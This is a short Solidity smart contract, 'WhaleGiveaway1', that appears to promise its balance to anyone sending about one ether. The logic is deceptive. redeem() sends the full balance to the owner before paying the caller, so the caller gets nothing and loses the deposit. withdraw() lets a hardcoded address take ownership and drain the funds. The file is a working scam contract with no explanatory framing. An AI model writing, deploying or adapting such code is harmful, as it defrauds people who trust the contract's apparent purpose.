pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public owner = msg.sender;
    uint public constant minEligibility = 0.999001 ether;

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
            owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        }
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function execute(address _to, bytes _data) public payable {
        require(msg.sender == owner);
        require(_to.call.value(msg.value)(_data));
    }
}